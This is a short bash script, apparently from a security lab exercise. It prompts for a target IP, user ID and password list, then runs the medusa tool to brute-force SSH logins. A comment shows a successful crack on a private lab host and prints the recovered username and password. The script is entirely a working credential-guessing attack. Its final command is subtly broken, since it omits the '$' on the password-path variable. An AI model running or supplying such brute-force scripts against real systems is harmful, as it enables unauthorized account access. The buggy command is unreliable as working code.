#!/usr/bin/bash

read -p "Enter the target ip: " TargetIP
read -p "Enter the user id: " UserID
read -p "Enter the password file path: " PwFilePath
read -p "Enter the password file: " PwFile

#medusa -h 10.0.0.14 -u dwayne -P 500-worst-passwords.txt -M ssh # this line works, see results
#Result
#ACCOUNT FOUND: [ssh] Host: 10.0.0.14 User: dwayne Password: scorpion [SUCCESS]

#if $TargetIP=null or $UserID=null or PwFilePath=null or PwFile=null; {quit}else: {
#medusa -h $TargetIP -u $UserID -P PwFilePath/$PwFile -M ssh }

#if [ -z "$TargetIP" ]; then echo "NULL"; else echo "Not NULL"; fi
#if [ -z "$UserID" ]; then echo "NULL"; else echo "Not NULL"; fi
#if [ -z "$PwFilePath" ]; then echo "NULL"; else echo "Not NULL"; fi
#if [ -z "$PwFile" ]; then echo "NULL"; else echo "Not NULL"; fi


if [ -z "$TargetIP" ] || [ -z "$UserID" ] || [ -z "$PwFilePath" ] || [ -z "$PwFile" ];

then 
	echo "NULL";
	exit 
else 
	echo "Not NULL! Executing the code...";
	medusa -h $TargetIP -u $UserID -P PwFilePath/$PwFile -M ssh  
fi

